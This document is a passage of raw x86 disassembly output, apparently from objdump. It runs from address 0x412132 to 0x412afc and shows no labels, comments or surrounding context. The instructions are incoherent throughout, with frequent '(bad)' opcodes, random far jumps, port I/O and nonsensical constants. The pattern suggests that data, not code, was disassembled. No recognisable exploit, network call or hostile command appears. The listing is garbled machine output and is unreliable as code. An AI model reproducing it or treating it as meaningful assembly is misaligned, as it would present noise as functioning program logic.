  412132:	call   DWORD PTR [esi]
  412134:	xchg   edi,eax
  412135:	data16 jne 0x412111
  412138:	hlt    
  412139:	enter  0xc1eb,0xfc
  41213d:	pop    ebp
  41213e:	js     0x4120ea
  412140:	dec    DWORD PTR [ebx+eax*2+0x7844ca32]
  412147:	mov    ds:0x16ff416f,al
  41214c:	xchg   DWORD PTR [edx],esi
  41214e:	movntps XMMWORD PTR ds:0xfd04c108,xmm0
  412155:	and    cl,0x9c
  412158:	cld    
  412159:	pop    ebp
  41215a:	ins    BYTE PTR es:[edi],dx
	...
  412173:	add    BYTE PTR [edi+0x57],ch
  412176:	mov    DWORD PTR [esi+0x71],eax
  412179:	jle    0x412139
  41217b:	je     0x41211b
  41217d:	cld    
  41217e:	pop    esp
  41217f:	or     bl,ch
  412181:	inc    edi
  412182:	xor    edx,edx
  412184:	lahf   
  412185:	retf   0x5c54
  412188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412189:	ret    
  41218a:	or     eax,0x17e8f
  41218f:	add    dh,ch
  412191:	shr    cl,0x10
  412194:	hlt    
  412195:	pop    esi
  412196:	xchg   esp,eax
  412197:	add    ch,BYTE PTR [edi+0xd]
  41219a:	sbb    BYTE PTR [edi],cl
  41219c:	adc    BYTE PTR [edi+0x0],0xc1
  4121a0:	sbb    al,0x5f
  4121a2:	jg     0x412183
  4121a4:	cmc    
  4121a5:	loope  0x41219a
  4121a7:	inc    esi
  4121a8:	je     0x41213b
  4121aa:	add    eax,0x302aed75
  4121af:	cmp    dh,BYTE PTR ds:0x1fc17656
  4121b5:	push   esi
  4121b6:	psrld  mm7,QWORD PTR [edi+0x3694fb9c]
  4121bd:	rol    BYTE PTR [eax-0x7c],cl
  4121c0:	mov    ah,0x33
  4121c2:	xchg   bh,bl
  4121c4:	out    0xbb,eax
  4121c6:	dec    ebx
  4121c7:	call   0xfe8cd505
  4121cc:	outs   dx,DWORD PTR ds:[esi]
  4121cd:	je     0x4121b9
  4121cf:	mov    al,BYTE PTR [edx+0x52]
  4121d2:	test   DWORD PTR [edi-0x26f8c8c0],edi
	...
  4121f0:	add    BYTE PTR [edi+0x12],al
  4121f3:	(bad)  
  4121f5:	sub    edi,DWORD PTR [ecx-0x1080e44c]
  4121fb:	pop    edx
  4121fc:	(bad)  
  4121fd:	in     eax,dx
  4121fe:	sub    eax,0x63b48502
  412203:	test   DWORD PTR [ecx],esp
  412205:	fwait
  412206:	jmp    0x412253
  412208:	jmp    0xe5df:0x1bc4b6d9
  41220f:	pop    es
  412210:	(bad)  [ebx]
  412212:	xor    bh,BYTE PTR [eax+0xa]
  412215:	mov    esi,0x9751e7b
  41221a:	scas   eax,DWORD PTR es:[edi]
  41221b:	dec    edx
  41221c:	add    bl,bh
  41221e:	mov    cl,0x3
  412220:	jmp    DWORD PTR [ebx+0x33]
  412223:	ja     0x412267
  412225:	cmc    
  412226:	add    al,0x23
  412228:	ret    0x1420
  41222b:	gs dec edi
  41222d:	dec    ecx
  41222e:	inc    esp
  41222f:	aad    0x7f
  412231:	ss enter 0xc211,0xcf
  412236:	adc    ebp,DWORD PTR [ebx+0x65]
  412239:	xor    BYTE PTR [ebp+edi*4+0x7f],al
  41223d:	mov    cl,0xc0
  41223f:	imul   eax,DWORD PTR [edx+esi*8-0x78],0xffffffc4
  412244:	dec    edx
  412245:	sbb    al,BYTE PTR [ecx+eiz*8-0x58]
  412249:	sti    
  41224a:	adc    esp,DWORD PTR [edi+0x2f]
  41224d:	or     DWORD PTR [ebp+edx*4+0x17],eax
  412251:	sub    eax,0xba5fc6
	...
  41226e:	lahf   
  41226f:	jmp    DWORD PTR [edi+0x7e5181fb]
  412275:	dec    ebx
  412276:	jmp    0x6e4b:0xccac7cae
  41227d:	dec    ebx
  41227e:	(bad)  
  412280:	(bad)  
  412281:	xlat   BYTE PTR ds:[ebx]
  412282:	inc    esi
  412283:	push   esi
  412284:	in     eax,dx
  412285:	xchg   ecx,eax
  412286:	test   BYTE PTR [edi+0x3b370fa6],0xe4
  41228d:	sti    
  41228e:	imul   DWORD PTR ds:0x43b24a4b
  412294:	add    DWORD PTR [edx-0x48b47e1],ebp
  41229a:	imul   eax,DWORD PTR [edi],0xc7e7ba62
  4122a0:	push   ds
  4122a1:	add    ah,bh
  4122a3:	or     dh,ch
  4122a5:	jg     0x412314
  4122a7:	inc    edx
  4122a8:	adc    eax,0xb8b8c4b
  4122ad:	dec    ebx
  4122ae:	jp     0x4122af
  4122b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122b1:	xlat   BYTE PTR ds:[ebx]
  4122b2:	out    0x65,al
  4122b4:	in     eax,dx
  4122b5:	xchg   ecx,eax
  4122b6:	test   BYTE PTR [edi-0x380c5901],0xf5
  4122bd:	in     eax,0x5f
  4122bf:	add    al,0xe9
  4122c1:	pushf  
  4122c2:	mov    ebp,0x9e22fe42
  4122c7:	scas   eax,DWORD PTR es:[edi]
  4122c8:	jb     0x41232f
  4122ca:	ds jns 0x4122cf
  4122cd:	bound  edi,QWORD PTR [ebp-0x9]
  4122d0:	inc    edx
  4122d1:	mov    edi,0x0
	...
  4122ea:	add    BYTE PTR [ebx],dh
  4122ec:	or     eax,DWORD PTR [ecx]
  4122ee:	shr    ch,cl
  4122f0:	(bad)  
  4122f1:	pop    ebp
  4122f2:	inc    ebp
  4122f3:	pop    ds
  4122f4:	xchg   BYTE PTR [ebp-0x52],dh
  4122f7:	scas   al,BYTE PTR es:[edi]
  4122f8:	inc    edx
  4122f9:	push   cs
  4122fa:	pop    edi
  4122fb:	cli    
  4122fc:	(bad)  
  4122fd:	dec    ebp
  4122fe:	aad    0x32
  412300:	cmp    DWORD PTR [ebx],eax
  412302:	loope  0x41230b
  412304:	sub    al,0x89
  412306:	(bad)  
  412307:	scas   al,BYTE PTR es:[edi]
  412308:	inc    edx
  412309:	cmp    ah,BYTE PTR [edi]
  41230b:	int3   
  41230c:	adc    eax,DWORD PTR [ebx-0x1bcc0e4]
  412312:	out    0x85,al
  412314:	pop    es
  412315:	mov    ebx,DWORD PTR [edi]
  412317:	add    al,0xc6
  412319:	cmc    
  41231a:	in     eax,dx
  41231b:	iret   
  41231c:	adc    ch,bl
  41231e:	jle    0x41236a
  412320:	shr    BYTE PTR [ebx+0x12],1
  412323:	adc    DWORD PTR [ebx],edx
  412325:	and    DWORD PTR [esi+ebp*1-0x7a0901bd],0x7
  41232d:	inc    ebx
  41232e:	push   0x3f
  412330:	or     al,0xf
  412332:	ins    DWORD PTR es:[edi],dx
  412333:	nop
  412334:	inc    ecx
  412335:	(bad)  
  412336:	cs sahf 
  412338:	mov    BYTE PTR [eax],ah
  41233a:	daa    
  41233b:	ds inc ebx
  41233d:	and    BYTE PTR [ecx],0x83
  412340:	mov    eax,0x112f6a21
  412345:	je     0x412303
  412347:	in     al,dx
  412348:	xchg   edi,edi
  41234a:	call   FWORD PTR [ebp+0x6]
  41234d:	je     0x412365
	...
  412367:	add    BYTE PTR [eax+0x4d001fe7],ch
  41236d:	aas    
  41236e:	test   BYTE PTR ds:0x3dfdcc4b,al
  412374:	in     al,0xe8
  412376:	(bad)  
  412377:	call   FWORD PTR [edx-0x7b]
  41237a:	clc    
  41237b:	std    
  41237c:	sub    cl,ah
  41237e:	xor    eax,eax
  412380:	in     al,0x46
  412382:	pop    esi
  412383:	push   fs
  412385:	aad    0xfb
  412387:	jmp    FWORD PTR [edx-0x22]
  41238a:	(bad)  
  41238c:	push   0xffffffcc
  41238e:	cmp    ecx,ebx
  412390:	cmp    cl,BYTE PTR [ecx-0x33a5032e]
  412396:	jle    0x4123d3
  412398:	pop    es
  412399:	cmp    eax,0xcc69cb83
  41239e:	std    
  41239f:	inc    ebx
  4123a0:	je     0x4123a4
  4123a2:	sti    
  4123a3:	(bad)  
  4123a4:	jp     0x4123b5
  4123a6:	pop    esi
  4123a7:	ins    BYTE PTR es:[edi],dx
  4123a8:	fimul  DWORD PTR [eax-0x33950127]
  4123ae:	or     eax,0xc8eceb6
  4123b3:	sbb    ch,bl
  4123b5:	add    eax,0x541c3b43
  4123ba:	sub    ecx,DWORD PTR [edi]
  4123bc:	push   ecx
  4123bd:	xchg   esp,eax
  4123be:	sti    
  4123bf:	jmp    FWORD PTR [edx]
  4123c1:	mov    dh,dh
  4123c3:	or     DWORD PTR [edx-0x1502533f],ebp
  4123c9:	retf   
  4123ca:	cmp    eax,0x0
	...
  4123e4:	add    ch,ch
  4123e6:	cmp    eax,DWORD PTR [edx-0x234375b]
  4123ec:	cmp    eax,0x93d
  4123f1:	call   0x491a:0xf4fd98c1
  4123f8:	cmp    al,0x74
  4123fa:	cmp    DWORD PTR [edx],eax
  4123fc:	add    BYTE PTR [ebp+0x3b],bl
  4123ff:	dec    eax
  412400:	(bad)  
  412401:	imul   eax,DWORD PTR [eax+0x2bf42002],0xfffffff7
  412408:	and    ebx,0x11fe472f
  41240e:	and    al,BYTE PTR ss:[eax]
  412411:	hlt    
  412412:	xor    al,BYTE PTR [eax+0x475a4179]
  412418:	cmp    al,0xb
  41241a:	or     al,0x4
  41241c:	add    BYTE PTR [ebx],al
  41241e:	mov    al,0xd7
  412420:	cld    
  412421:	sub    eax,DWORD PTR [edx+0x2bd45f05]
  412427:	add    cl,BYTE PTR [edi]
  412429:	jo     0x4123f2
  41242b:	inc    esi
  41242c:	(bad)  
  41242d:	adc    ebp,DWORD PTR [eax]
  41242f:	add    dh,BYTE PTR [eax]
  412431:	hlt    
  412432:	sub    ebx,DWORD PTR [ecx-0x47]
  412435:	add    bl,BYTE PTR [edx+0x3f9a3a47]
  41243b:	test   DWORD PTR [edx-0x1b877aa],0xb903f7fb
  412445:	repnz push ebp
  412447:	add    al,BYTE PTR [eax]
	...
  412461:	add    BYTE PTR [edi],dh
  412463:	jae    0x4124a6
  412465:	jbe    0x412488
  412467:	aaa    
  412468:	jle    0x412499
  41246a:	enter  0x47df,0x82
  41246e:	mov    esp,0x1383f725
  412473:	rol    BYTE PTR [edi-0x2],cl
  412476:	ja     0x41243e
  412478:	and    cl,BYTE PTR [edi]
  41247a:	jo     0x4124dc
  41247c:	inc    esi
  41247d:	(bad)  
  41247e:	mov    ds:0x9bffa239,eax
  412483:	test   DWORD PTR cs:[ebx+0x482504e7],0xf169028a
  41248e:	add    DWORD PTR [eax-0x1],0xffffffb6
  412492:	js     0x4124d4
  412494:	or     eax,0xe8e4f406
  412499:	add    edi,ebx
  41249b:	sub    ah,0x46
  41249e:	bound  eax,QWORD PTR [eax-0x4d]
  4124a1:	std    
  4124a2:	sti    
  4124a3:	add    al,0xe9
  4124a5:	clc    
  4124a6:	jns    0x4124dc
  4124a8:	loope  0x4124f1
  4124aa:	dec    edx
  4124ab:	add    cl,BYTE PTR [esi]
  4124ad:	and    al,0xf4
  4124af:	add    al,0xe6
  4124b1:	jg     0x412506
  4124b3:	cmp    al,0xcd
  4124b5:	inc    edi
  4124b6:	lock fisttp WORD PTR [eax]
  4124b9:	add    al,0xf4
  4124bb:	pcmpgtw mm5,QWORD PTR [ecx]
  4124be:	push   ds
  4124bf:	inc    eax
  4124c0:	mov    ch,0x9
  4124c2:	hlt    
  4124c3:	hlt    
  4124c4:	call   0x4124cc
	...
  4124dd:	add    BYTE PTR [eax],al
  4124df:	sbb    eax,0xa47a417
  4124e4:	cld    
  4124e5:	ds fdiv st,st(2)
  4124e8:	cmp    DWORD PTR [edi+0x49],0xfffffffa
  4124ec:	aas    
  4124ed:	fisttp QWORD PTR [ebp+0x4c69c3f6]
  4124f3:	std    
  4124f4:	packssdw mm1,QWORD PTR [ecx-0x7c8ac022]
  4124fb:	jecxz  0x41250e
  4124fd:	fidivr WORD PTR [ebp-0x4b]
  412500:	inc    eax
  412501:	gs inc edi
  412503:	or     BYTE PTR [edx+0xff403e8],cl
  412509:	ins    DWORD PTR es:[edi],dx
  41250a:	(bad)  
  41250b:	mov    edi,0xdb094d3f
  412510:	in     al,0xe8
  412512:	add    edi,ebx
  412514:	xchg   BYTE PTR [esi+0x4b],bl
  412517:	mov    ds:0xf8f3ff3f,al
  41251c:	in     al,0xff
  41251e:	call   0x25e1aead
  412523:	xor    edi,DWORD PTR [edi]
  412525:	call   0xfe805499
  41252a:	rcl    BYTE PTR [ecx-0x55],cl
  41252d:	push   cs
  41252e:	push   0xffffff94
  412530:	inc    eax
  412531:	inc    BYTE PTR [esi]
  412533:	arpl   WORD PTR [ecx+0x2],di
  412536:	stos   BYTE PTR es:[edi],al
  412537:	jbe    0x412570
  412539:	or     esi,esp
  41253b:	jne    0x4124c6
  41253d:	sti    
  41253e:	out    dx,al
  41253f:	mov    edx,0xf4f782
	...
  41255c:	inc    edx
  41255d:	mov    DWORD PTR [esi-0x1e],ebp
  412560:	mov    edx,0xf76c3c3e
  412565:	add    al,0x0
  412567:	fidiv  WORD PTR [ebx-0x4d39055d]
  41256d:	add    BYTE PTR [edi],ah
  41256f:	or     eax,edi
  412571:	add    al,0xf
  412573:	outs   dx,DWORD PTR ds:[esi]
  412574:	cmp    bh,BYTE PTR [ebx]
  412576:	(bad)  
  412577:	scas   al,BYTE PTR es:[edi]
  412578:	cld    
  412579:	in     eax,dx
  41257a:	pop    ds
  41257b:	jmp    0x3dc83577
  412580:	lods   al,BYTE PTR ds:[esi]
  412581:	inc    BYTE PTR ds:[eax-0x7101c5c8]
  412588:	jmp    0x4e78:0xe2e84678
  41258f:	jmp    0x4125c9
  412591:	pop    esi
  412592:	pop    es
  412593:	loop   0x4125c5
  412595:	add    eax,eax
  412597:	push   0x12
  412599:	add    ecx,DWORD PTR [ecx+0x44fb27ac]
  41259f:	stc    
  4125a0:	lods   al,BYTE PTR ds:[esi]
  4125a1:	adc    ecx,DWORD PTR [ebx+0x391c3a7]
  4125a7:	push   0x85062e
  4125ac:	in     al,0x49
  4125ae:	add    eax,0x293e7d8b
  4125b3:	shl    DWORD PTR [esi],1
  4125b5:	cmp    eax,0x7084d231
  4125ba:	inc    esi
  4125bb:	jne    0x412558
  4125bd:	mov    ebx,0x6c54
	...
  4125d6:	add    BYTE PTR [eax],al
  4125d8:	add    BYTE PTR [esi-0x7575bf0d],ah
  4125de:	rcl    DWORD PTR [ebx-0xc],0x41
  4125e2:	or     BYTE PTR ds:0x21782,0x0
  4125e9:	mov    eax,ds:0xa144747b
  4125ee:	jge    0x4125fd
  4125f0:	xchg   ebx,esi
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	add    BYTE PTR [edx-0x70],al
  4125f7:	push   ebp
  4125f8:	add    al,0xde
  4125fa:	stc    
  4125fb:	cmp    cl,BYTE PTR [ebp+0x52]
  4125fe:	nop
  4125ff:	inc    ebp
  412600:	add    dl,BYTE PTR [edx-0x52]
  412603:	mov    edi,0xddce089
  412608:	mov    dh,0xd2
  41260a:	add    ecx,eax
  41260c:	loope  0x412623
  41260e:	cmp    eax,0x7f8b0fc6
  412613:	add    ecx,eax
  412615:	jge    0x412658
  412617:	or     edx,eax
  412619:	test   BYTE PTR [ebp-0x6],dh
  41261c:	mov    eax,ecx
  41261e:	shl    BYTE PTR [ebx+0x8],1
  412621:	inc    ebp
  412622:	enter  0xfffd,0xf2
  412626:	mov    ecx,0x6e66f843
  41262b:	repnz or DWORD PTR [edx-0x4dd216c3],0xffffff8f
  412633:	mov    esi,0x818b858d
  412638:	loope  0x412606
  41263a:	mov    edx,0xec4b
	...
  412653:	add    BYTE PTR [eax],al
  412655:	add    ah,dh
  412657:	test   BYTE PTR es:[edi-0x3da63a],al
  41265e:	cli    
  41265f:	test   DWORD PTR [ebx+0x26c26d9],eax
  412665:	inc    edi
  412666:	ins    DWORD PTR es:[edi],dx
  412667:	push   0xf4398846
  41266c:	jle    0x41262d
  41266e:	add    DWORD PTR [edx+ecx*4],esi
  412671:	inc    BYTE PTR [ebx+0x3188c51e]
  412677:	adc    al,0x7f
  412679:	rol    DWORD PTR [ebx],1
  41267b:	test   al,0x1a
  41267d:	lock imul eax,DWORD PTR [esi],0x11
  412681:	shl    BYTE PTR [esi+0x1f13aeb4],cl
  412687:	loop   0x412650
  412689:	sub    eax,0x8aeab853
  41268e:	mov    eax,ds:0x4474435f
  412693:	mov    dl,0x3c
  412695:	mov    ch,BYTE PTR [edi]
  412697:	inc    ebx
  412698:	fsubr  st,st(6)
  41269a:	xor    ecx,DWORD PTR [esi+0x7d]
  41269d:	mov    edi,0x14cdaffb
  4126a2:	hlt    
  4126a3:	sub    edi,edi
  4126a5:	pop    esp
  4126a6:	and    BYTE PTR [esi-0x43],dh
  4126a9:	adc    edi,DWORD PTR [edi-0x18]
  4126ac:	out    dx,eax
  4126ad:	cmp    dh,BYTE PTR [ecx+0x6fd7c467]
  4126b3:	lock inc edi
  4126b5:	mov    dh,BYTE PTR [ecx+0xc80793]
	...
  4126d3:	add    esp,DWORD PTR [edx-0x7c1411a7]
  4126d9:	jg     0x412757
  4126db:	shr    BYTE PTR [esi],1
  4126dd:	repz sbb DWORD PTR [ecx+0x7f00025a],0xffffffe1
  4126e5:	inc    edi
  4126e6:	mov    BYTE PTR [ecx],dh
  4126e8:	add    eax,0xe13878fd
  4126ed:	test   al,0x7a
  4126ef:	xor    cl,ah
  4126f1:	mov    eax,0xe911795a
  4126f6:	add    ebp,DWORD PTR [ebx+0x4878e0b2]
  4126fc:	xor    DWORD PTR ds:0x2e908bce,edi
  412702:	js     0x4126c2
  412704:	sub    eax,0x3c8a54d5
  412709:	imul   eax,DWORD PTR [ebx-0xe],0xffffff80
  41270d:	retf   0x7bee
  412710:	cmp    al,0xe9
  412712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412713:	addr16 cs inc edx
  412716:	push   esp
  412717:	push   0x3c
  412719:	jae    0x4126d7
  41271b:	hlt    
  41271c:	xchg   DWORD PTR ds:0xfcc26d22,esp
  412722:	js     0x41271e
  412724:	clc    
  412725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412726:	rcr    eax,1
  412728:	clc    
  412729:	xor    DWORD PTR [edx-0x44d40700],edi
  41272f:	ror    BYTE PTR [ebx],1
  412731:	lahf   
  412732:	fcomi  st,st(7)
  412734:	neg    DWORD PTR [edi+0x0]
	...
  41274e:	add    BYTE PTR [eax],al
  412750:	mov    ecx,0xf5cb7f0b
  412755:	or     edx,DWORD PTR [ebp+0x45]
  412758:	ins    BYTE PTR es:[edi],dx
  412759:	retf   0x13c4
  41275c:	dec    edx
  41275d:	int3   
  41275e:	out    0x44,eax
  412760:	adc    al,0xd
  412762:	repnz dec ebx
  412764:	bnd jb 0x41278c
  412767:	pop    es
  412768:	xor    eax,0xb60ee025
  41276d:	lea    ebx,[ebx]
  41276f:	inc    eax
  412770:	jl     0x412733
  412772:	cmp    BYTE PTR [ecx+0x437d7cfb],0xda
  412779:	mov    ebx,0x33bd5fff
  41277e:	and    BYTE PTR [esi-0x9c9d003],0x3d
  412785:	jl     0x412713
  412787:	mov    cl,0x39
  412789:	xchg   eax,esp
  41278b:	call   0xdf2cf010
  412790:	jne    0x412715
  412792:	sar    DWORD PTR [ebx+0x7f0d3bb7],1
  412798:	jo     0x4127f7
  41279a:	jno    0x412745
  41279c:	test   ebx,0x8ccb9c88
  4127a2:	inc    esp
  4127a3:	and    DWORD PTR [ebp+0x7b],ebp
  4127a6:	je     0x4127a3
  4127a8:	(bad)  
  4127a9:	cmp    bh,dh
  4127ab:	push   ss
  4127ac:	aaa    
  4127ad:	cs pop es
  4127af:	fidivr DWORD PTR [eax+0x288ac4]
	...
  4127cd:	jno    0x412797
  4127cf:	sti    
  4127d0:	jo     0x4127ff
  4127d2:	xor    esi,DWORD PTR [edx]
  4127d4:	sbb    edi,DWORD PTR [edx]
  4127d6:	mov    WORD PTR [ebp+edx*8+0x4a],ss
  4127da:	dec    ebp
  4127db:	jnp    0x4127fc
  4127dd:	inc    ebx
  4127de:	fldcw  WORD PTR [ebx-0x12]
  4127e1:	jb     0x412771
  4127e3:	cli    
  4127e4:	(bad)  
  4127e5:	mov    dh,0xa
  4127e7:	mov    dh,0xea
  4127e9:	jp     0x41282e
  4127eb:	xor    bl,BYTE PTR [ebx+0x2b06247a]
  4127f1:	ret    
  4127f2:	and    eax,0x44cc248a
  4127f7:	out    0xea,eax
  4127f9:	jns    0x412802
  4127fb:	or     BYTE PTR [edx],ch
  4127fd:	ins    BYTE PTR es:[edi],dx
  4127fe:	dec    ebx
  4127ff:	push   cs
  412800:	sbb    bh,BYTE PTR gs:0xc13696fe
  412807:	adc    esp,DWORD PTR [edx-0x3c]
  41280a:	cmp    BYTE PTR ds:[eax],al
  41280d:	sub    BYTE PTR ds:0x4d66cd7e,bl
  412813:	idiv   BYTE PTR [ebx]
  412815:	xchg   ebp,eax
  412816:	pop    ss
  412817:	test   bl,bl
  412819:	dec    ebx
  41281a:	(bad)  
  41281b:	std    
  41281c:	sbb    eax,0xffffffea
  41281f:	dec    BYTE PTR [eax-0x7bf0ed78]
  412825:	jecxz  0x412838
  412827:	add    BYTE PTR [eax],al
  412829:	push   ss
  41282a:	dec    ebp
  41282b:	and    al,BYTE PTR [eax+0x24]
  41282e:	dec    ebp
  41282f:	and    dl,BYTE PTR [eax+0x0]
	...
  41284a:	inc    esp
  41284b:	popf   
  41284c:	adc    al,BYTE PTR [eax]
  41284e:	popf   
  41284f:	mov    eax,DWORD PTR [esp+ebp*2-0x72]
  412853:	leave  
  412854:	sub    ebx,eax
  412856:	dec    esp
  412857:	cmp    edi,DWORD PTR [edi+0x133e090f]
  41285d:	add    BYTE PTR [ebp-0x78],bl
  412860:	add    DWORD PTR [ebx+0x45],eax
  412863:	dec    edi
  412864:	dec    DWORD PTR [esi]
  412866:	rcl    BYTE PTR [esi],1
  412868:	cli    
  412869:	call   FWORD PTR [edx-0x12]
  41286c:	je     0x412861
  41286e:	dec    edx
  41286f:	les    ecx,FWORD PTR [ecx-0x38cd36ba]
  412875:	sub    ecx,DWORD PTR [esi+0x4ac13946]
  41287b:	mov    dl,BYTE PTR ds:0xf061d15
  412881:	mov    dh,0x2e
  412883:	mov    DWORD PTR [eax+esi*1+0x2a],eax
  412887:	mov    esp,0x1ca7014d
  41288c:	add    al,BYTE PTR [ebx+0x5]
  41288f:	adc    al,BYTE PTR [ecx]
  412891:	jmp    0x412902
  412893:	adc    al,0xb6
  412895:	inc    edi
  412896:	or     al,0x15
  412898:	mov    dh,0x4f
  41289a:	(bad)  
  41289c:	fimul  WORD PTR [eax]
  41289e:	hlt    
  41289f:	es inc ecx
  4128a1:	mov    BYTE PTR [ecx],dh
  4128a3:	mov    BYTE PTR [esi+eax*8-0x394a6909],al
  4128aa:	xor    DWORD PTR [edx+eax*1+0x0],edi
	...
  4128c5:	add    BYTE PTR [eax],al
  4128c7:	hlt    
  4128c8:	sub    ecx,DWORD PTR [edi]
  4128ca:	mov    dh,0x33
  4128cc:	sub    eax,0x2e2bb60f
  4128d1:	and    DWORD PTR [eax+edi*4+0x2b],0x41
  4128d6:	(bad)  
  4128d8:	es inc esp
  4128da:	xor    al,dh
  4128dc:	stos   DWORD PTR es:[edi],eax
  4128dd:	cmp    ah,BYTE PTR ds:0x8845d7f3
  4128e3:	inc    ecx
  4128e4:	enter  0xd52c,0x77
  4128e8:	dec    eax
  4128e9:	push   DWORD PTR ds:[edx-0xbffcda0]
  4128f0:	sub    eax,DWORD PTR [edx]
  4128f2:	inc    edi
  4128f3:	(bad)  
  4128f4:	and    eax,0xa4b4bff3
  4128f9:	(bad)  
  4128fa:	out    dx,eax
  4128fb:	jge    0x41295d
  4128fd:	ds jmp 0x7ef4:0xfba6ae66
  412905:	inc    edx
  412906:	aas    
  412907:	jge    0x412971
  412909:	xor    al,BYTE PTR [esi+0x5f]
  41290c:	inc    edx
  41290d:	lea    eax,[edi+0x55]
  412910:	scas   al,BYTE PTR es:[edi]
  412911:	and    DWORD PTR [eax],eax
  412913:	ins    DWORD PTR es:[edi],dx
  412914:	call   0xa3b33748
  412919:	cmp    DWORD PTR [ecx-0x4c],esi
  41291c:	sub    ecx,DWORD PTR [edi]
  41291e:	mov    esi,0x3fb32c74
  412923:	hlt    
  412924:	loop   0x4128b0
  412926:	dec    esp
  412927:	adc    BYTE PTR [ebp+eax*8+0xf7],ah
	...
  412942:	add    BYTE PTR [eax],al
  412944:	jno    0x4129b1
  412946:	mov    ch,0x7
  412948:	cmp    al,0x4
  41294a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41294b:	inc    eax
  41294c:	cli    
  41294d:	mov    eax,0x8ebc66f
  412952:	pop    edi
  412953:	sbb    BYTE PTR [ebx],dh
  412955:	das    
  412956:	and    ebx,DWORD PTR [esi*8-0x15c7e473]
  41295d:	add    BYTE PTR [ebx+eax*1-0x2e9dfb0c],0x1b
  412965:	or     BYTE PTR [edi],dh
  412967:	pmulhw mm6,mm3
  41296a:	cmp    cl,BYTE PTR [edx-0x318eced8]
  412970:	scas   eax,DWORD PTR es:[edi]
  412971:	ret    
  412972:	pop    edi
  412973:	(bad)  
  412974:	pop    es
  412975:	cld    
  412976:	and    bh,BYTE PTR [edi-0xb16d430]
  41297c:	(bad)
  41297f:	loop   0x4129a0
  412981:	or     BYTE PTR [edx-0x22],ch
  412984:	out    0x4,eax
  412986:	jmp    0x7255739b
  41298b:	ror    ebx,1
  41298d:	pop    es
  41298e:	push   edi
  41298f:	paddd  mm0,mm3
  412992:	iret   
  412993:	into   
  412994:	or     BYTE PTR [si+0x14],ah
  412998:	pop    ebp
  412999:	cmp    BYTE PTR ds:0x7210b040,al
  41299f:	into   
  4129a0:	dec    edi
  4129a1:	(bad)  
  4129a2:	mov    ds:0xb151ca17,eax
  4129a7:	dec    ebx
	...
  4129c0:	add    dl,dh
  4129c2:	cmp    BYTE PTR [esi+0x31],0x3a
  4129c6:	cmp    BYTE PTR [ecx-0x3f],ch
  4129c9:	pop    ds
  4129ca:	add    eax,0x10bd88e6
  4129cf:	jmp    0xc51b96d7
  4129d4:	sti    
  4129d5:	xor    edi,DWORD PTR [edx+0x10c08cfc]
  4129db:	add    dl,dh
  4129dd:	sub    DWORD PTR [edx+esi*2+0x126ef2d3],ebp
  4129e4:	jb     0x412a10
  4129e6:	call   0xb4580f9
  4129eb:	cmp    DWORD PTR [esp+ebp*1],esp
  4129ee:	mov    cl,0x24
  4129f0:	sub    ah,BYTE PTR [ebx]
  4129f2:	rcl    DWORD PTR [ebx],0xc0
  4129f5:	lods   al,BYTE PTR ds:[esi]
  4129f6:	adc    edi,DWORD PTR [edx+ecx*4+0x1f]
  4129fa:	push   ds
  4129fb:	mov    ebp,DWORD PTR [edi]
  4129fd:	mov    ah,0x80
  4129ff:	mov    edi,0x5cfbe6f5
  412a04:	icebp  
  412a05:	or     DWORD PTR [ecx],0x8cb93033
  412a0b:	dec    ebp
  412a0c:	mov    ch,0xae
  412a0e:	inc    esp
  412a0f:	push   cs
  412a10:	pop    esi
  412a11:	fidivr DWORD PTR [esi+edi*8]
  412a14:	inc    esi
  412a15:	ja     0x4129cf
  412a17:	out    dx,eax
  412a18:	jmp    0x447fac1f
  412a1d:	retf   
  412a1e:	cmp    cl,BYTE PTR ss:[ebx+eax*8+0x498206]
	...
  412a3e:	mov    eax,0x3d72fe36
  412a43:	jecxz  0x412a84
  412a45:	pusha  
  412a46:	cmp    eax,0x5b94fee3
  412a4b:	mov    dl,dh
  412a4d:	xchg   ebx,eax
  412a4e:	div    DWORD PTR [edi]
  412a50:	je     0x412a2f
  412a52:	jle    0x412a9e
  412a54:	(bad)  
  412a55:	jl     0x412a46
  412a57:	into   
  412a58:	(bad)  
  412a59:	je     0x412a42
  412a5b:	aaa    
  412a5c:	je     0x412a53
  412a5e:	cli    
  412a5f:	mov    al,0x7
  412a61:	rol    ebp,1
  412a63:	sub    edi,esi
  412a65:	(bad)  
  412a66:	cmp    BYTE PTR ds:[edi+0x15546cde],0x0
  412a6e:	or     eax,0x515d3b03
  412a73:	jb     0x412a47
  412a75:	jmp    0x3f232f
  412a7a:	xchg   esi,eax
  412a7b:	push   esp
  412a7c:	cli    
  412a7d:	(bad)  
  412a7e:	enter  0x11c,0x0
  412a82:	fld    QWORD PTR [edx]
  412a84:	cmp    ecx,0xffffffdc
  412a87:	jbe    0x412aa8
  412a89:	cmp    edx,DWORD PTR [ebx]
  412a8b:	jne    0x412a9a
  412a8d:	sub    esp,0xfffffff7
  412a90:	std    
  412a91:	jmp    edx
  412a93:	mov    al,0x9
  412a95:	inc    ebx
  412a96:	test   BYTE PTR [ebp-0xe],dl
  412a99:	addps  xmm0,XMMWORD PTR [ebx-0xa]
  412a9d:	call   DWORD PTR [edx-0x9]
  412aa0:	inc    ebx
  412aa1:	adc    al,0x0
	...
  412abb:	es push ebp
  412abd:	cli    
  412abe:	cmp    DWORD PTR [eax+0xe],edx
  412ac1:	jle    0x412aa2
  412ac3:	push   es
  412ac4:	leave  
  412ac5:	or     eax,0xfde5cb84
  412aca:	call   FWORD PTR [esi]
  412acc:	inc    ebp
  412acd:	jmp    0x180f:0x12551400
  412ad4:	iret   
  412ad5:	adc    DWORD PTR [eax],eax
  412ad7:	lea    ecx,[ecx-0x35a903a5]
  412add:	jnp    0x412b11
  412adf:	inc    esi
  412ae0:	pop    eax
  412ae1:	push   0x73
  412ae3:	pop    esi
  412ae4:	pop    es
  412ae5:	mov    dh,0xb
  412ae7:	xor    al,0x55
  412ae9:	bnd jne 0x412b24
  412aec:	inc    ebx
  412aed:	std    
  412aee:	inc    ebp
  412aef:	sub    DWORD PTR [ecx],edi
  412af1:	inc    ebx
  412af2:	adc    al,0xd1
  412af4:	jmp    0x412adf
  412af6:	sbb    al,dh
  412af8:	ds jp  0x412a80
  412afb:	pop    ebp
  412afc:	jge    0x412b0f
